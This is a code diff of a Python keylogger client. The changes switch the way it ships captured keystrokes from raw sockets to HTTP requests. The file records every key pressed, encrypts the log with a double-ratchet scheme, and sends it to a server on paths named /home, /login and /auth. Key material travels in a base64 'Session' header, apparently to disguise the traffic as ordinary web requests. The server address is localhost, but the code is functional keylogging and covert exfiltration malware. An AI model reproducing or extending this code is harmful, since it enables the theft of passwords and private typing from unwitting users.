@@ -2,54 +2,55 @@
 from pynput import keyboard
 from threading import Timer
 from time import sleep
-import socket
-import errno
 import double_ratchet
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.backends import default_backend
-from requests import Session
+import requests
 import random
 import sys
+import base64
 
 
-HEADER_LENGTH = 24
-URL = "http://localhost:8080/message.txt"
+# constants
+SEND_URL = "/home"
+KEY_URL = "/login"
+SERVER_KEY = "/auth"
 INTERVAL_SEND = 10
 SERVER_IP = "localhost"
-SERVER_PORT = 8081
+SERVER_PORT = 8000
+EXCHANGE_MSG_MAX = 3
+USE_POST = True
+
+# global variables
+exchanged_msgs = 0
 
 
 class Keylogger:
 
-    def __init__(self, interval, ip, port, h_length):
+    def __init__(self, interval, ip, port):
         self.interval = interval
         self.ip = ip
         self.port = port
-        self.header_lenght = h_length
         self.log = ""
-        self.client_socket = None
         self.__r = double_ratchet.Ratchet()
         self.__start_connection()
-        self.__s = Session()
         self.__pair_pkey()
         
     def __start_connection(self):
-        # starting socket based connection
-        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client_socket.connect((self.ip, self.port))
-        self.client_socket.setblocking(False)
-        # send public key to pair the connection
-        usr_hlenght = f"{len(self.__r.getPublicKey().decode('utf-8')):<{self.header_lenght}}".encode('utf-8')
-        self.client_socket.send(usr_hlenght + self.__r.getPublicKey())
+        # send public key in Session Header to pair the connection
+        key = self.__r.getPublicKey()
+        headers = {'Session': base64.b64encode(key)}
+        _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)
 
     def __pair_pkey(self):
+        global exchanged_msgs
         # update the public key of the server
         sleep(3)
-        r = self.__s.get(URL)
-        clavepublica = bytes(r.text, 'ascii')
-        dhpublica: dh.DHPublicKey = serialization.load_pem_public_key(clavepublica, backend=default_backend())
-        self.__r.pairComm(dhpublica)
+        r = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SERVER_KEY)
+        pubkey = bytes(r.text, 'ascii')
+        dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
+        self.__r.pairComm(dhpub)
 
     # function to add the pressed keys to the current ones
     def __append_to_log(self, string):
@@ -73,30 +74,24 @@ class Keylogger:
     def __send_2_server(self):
         # if no keys were pressed, do nothing
         if self.log != "":
+            global exchanged_msgs
             message = self.log
             # encrypt the pressed keys
-            cifrado = self.__r.encrypt(message)
-            message_header = f"{len(cifrado):<{self.header_lenght}}".encode('utf-8')
-            msg = message_header + cifrado
+            cipher = self.__r.encrypt(message)
+            b64_cipher = base64.b64encode(cipher)
             # send the encrypted keys to the server
-            self.client_socket.send(msg)
-            sleep(3)
-            self.__pair_pkey()
-            usr_hlenght = f"{len(self.__r.getPublicKey().decode('utf-8')):<{self.header_lenght}}".encode('utf-8')
-            self.client_socket.send(usr_hlenght + self.__r.getPublicKey())
-        try:
-            while True:
-                username_header = self.client_socket.recv(self.header_lenght)
-                if not len(username_header):
-                    raise ConnectionError
-                message_header = self.client_socket.recv(self.header_lenght)
-                message_length = int(message_header.decode('utf-8').strip())
-                message = self.client_socket.recv(message_length).decode('utf-8')
-                self.client_socket.close()
-        except IOError as e:
-            if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
-                print(f'Reading error: {str(e)}')
-                raise ConnectionError
+            if USE_POST:
+                _ = requests.post('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SEND_URL, data=b64_cipher)
+            else:
+                headers = {'Session': b64_cipher}
+                _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SEND_URL, headers=headers)
+            exchanged_msgs += 1
+            if exchanged_msgs == EXCHANGE_MSG_MAX:
+                exchanged_msgs = 0
+                self.__pair_pkey()
+                key = self.__r.getPublicKey()
+                headers = {'Session': base64.b64encode(key)}
+                _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)
 
     # function to send the user input in the given interval
     def __report(self):
@@ -120,20 +115,16 @@ class Keylogger:
             self.__keyboard_listener.join()
     
     def exit(self):
-        usr_hlenght = f"{len('close'.encode('utf-8')):<{self.header_lenght}}".encode('utf-8')
-        self.client_socket.send(usr_hlenght)
-        # close the socket
-        self.client_socket.close()
-        # exit the program
         self.__keyboard_listener.stop()
-        sys.exit()
+        requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + '/logout')
 
 
 random.seed(10)
+keylogger = None
 while (True):
     try:
         # adding a print interval of a min of 5 seconds
-        keylogger = Keylogger(INTERVAL_SEND, SERVER_IP, SERVER_PORT, HEADER_LENGTH)
+        keylogger = Keylogger(INTERVAL_SEND, SERVER_IP, SERVER_PORT)
         # starting the keyloggger
         keylogger.start()
     except ConnectionError as e:
@@ -142,3 +133,7 @@ while (True):
         continue
     except KeyboardInterrupt:
         keylogger.exit()
+        sys.exit(0)
+    except Exception as e:
+        if keylogger is not None:
+            keylogger.exit()
